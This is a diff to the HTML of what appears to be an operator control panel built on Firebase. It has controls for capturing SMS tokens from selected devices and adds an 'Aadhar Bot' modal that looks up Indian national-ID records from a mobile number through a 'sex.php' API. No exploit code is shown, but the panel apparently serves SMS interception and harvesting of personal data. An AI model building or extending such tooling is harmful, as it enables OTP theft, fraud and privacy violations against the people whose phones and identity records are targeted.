@@ -113,14 +113,16 @@
     </section>
 
     <section class="screen" id="screen-more">
-      <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
+      <span class="proto-tag">📱 FULL PANEL — sex.php features</span>
       <div class="menu-list">
         <div class="menu-item" onclick="openFbSheet()">Firebase Project <span id="moreFbName">—</span></div>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
-        <a class="menu-item" href="#" onclick="toast('Built-in APK panel',true);return false;" style="text-decoration:none;color:inherit">Desktop Panel <span>sex.php →</span></a>
+        <div class="menu-item" onclick="openAadhar()">🪪 Aadhar Bot <span>Lookup</span></div>
+        <div class="menu-item" onclick="refreshData()">↻ Refresh All Data <span>Firebase</span></div>
         <div class="menu-item danger" onclick="doLogout()">Logout</div>
       </div>
+      <div class="token-log-wrap" id="autoTokenLog"></div>
     </section>
   </div>
 
@@ -141,6 +143,19 @@
 </div>
 <div class="toast-wrap" id="toasts"></div>
 
+<div class="modal-overlay hidden" id="aadharModal" onclick="closeAadhar(event)">
+  <div class="modal-card" onclick="event.stopPropagation()">
+    <button class="modal-close" onclick="closeAadhar()">✕</button>
+    <h2>🪪 Aadhar Bot</h2>
+    <p class="modal-sub">Mobile number se aadhar lookup (sex.php API)</p>
+    <input class="form-input" id="aadharNum" type="tel" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/>
+    <button class="btn-send" onclick="lookupAadhar()" style="margin-top:12px">Lookup</button>
+    <div id="aadharStatus" class="modal-status"></div>
+    <div id="aadharResult" class="data-list" style="margin-top:12px;max-height:200px;overflow-y:auto"></div>
+  </div>
+</div>
+
 <script src="app.js"></script>
+<script src="panel_ext.js"></script>
 </body>
 </html>
